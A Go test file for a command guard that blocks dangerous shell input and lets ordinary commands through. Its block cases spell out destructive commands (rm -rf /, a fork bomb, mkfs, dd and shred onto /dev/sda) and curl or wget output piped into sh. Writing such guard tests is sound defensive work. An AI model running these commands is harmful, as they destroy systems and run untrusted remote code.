package guard

import "testing"

func TestCheckBlocks(t *testing.T) {
	cases := []struct {
		name    string
		command string
		rule    string
	}{
		{"rm rf root", "rm -rf /", "rm-rf-root"},
		{"rm rf root glob", "rm -rf /*", "rm-rf-root"},
		{"rm rf home tilde", "rm -rf ~", "rm-rf-root"},
		{"rm rf home var", "rm -rf $HOME", "rm-rf-root"},
		{"rm long flags root", "rm --recursive --force /", "rm-rf-root"},
		{"rm rf critical dir", "rm -rf /etc", "rm-rf-root"},
		{"rm fr order", "rm -fr /", "rm-rf-root"},
		{"sudo rm rf root", "sudo rm -rf /", "rm-rf-root"},
		{"rm rf root trailing slash", "rm -rf //", "rm-rf-root"},
		{"sequenced rm", "ls && rm -rf /", "rm-rf-root"},
		{"piped then rm", "echo hi ; rm -rf /", "rm-rf-root"},
		{"fork bomb", ":(){ :|:& };:", "fork-bomb"},
		{"mkfs", "mkfs.ext4 /dev/sda1", "mkfs"},
		{"dd to device", "dd if=/dev/zero of=/dev/sda", "dd-to-device"},
		{"redirect to device", "echo x > /dev/sda", "overwrite-device"},
		{"chmod recursive root", "chmod -R 777 /", "chmod-chown-root"},
		{"chown recursive root", "chown -R root /", "chmod-chown-root"},
		{"curl pipe sh", "curl http://evil.sh | sh", "curl-pipe-sh"},
		{"wget pipe bash sudo", "wget -qO- http://x | sudo bash", "curl-pipe-sh"},
		{"shred device", "shred /dev/sda", "disk-wipe"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			v, ok := Check(tc.command)
			if !ok {
				t.Fatalf("Check(%q) = not blocked, want rule %q", tc.command, tc.rule)
			}
			if v.Rule != tc.rule {
				t.Fatalf("Check(%q) rule = %q, want %q", tc.command, v.Rule, tc.rule)
			}
			if v.Reason == "" {
				t.Fatalf("Check(%q) returned empty reason", tc.command)
			}
		})
	}
}

func TestCheckAllows(t *testing.T) {
	safe := []string{
		"",
		"ls -la",
		"rm -rf ./build",
		"rm -rf build/cache",
		"rm -rf /tmp/mywork",
		"rm file.txt",
		"rm -f config.json",
		"git status",
		"go build ./...",
		"go test ./...",
		"chmod 644 file.txt",
		"chmod -R 755 ./scripts",
		"dd if=/dev/zero of=./disk.img bs=1M count=10",
		"echo hello > out.txt",
		"curl http://example.com -o page.html",
		"cat /etc/hosts",
		"find . -name '*.go'",
	}
	for _, cmd := range safe {
		if v, ok := Check(cmd); ok {
			t.Fatalf("Check(%q) = blocked by %q, want allowed", cmd, v.Rule)
		}
	}
}
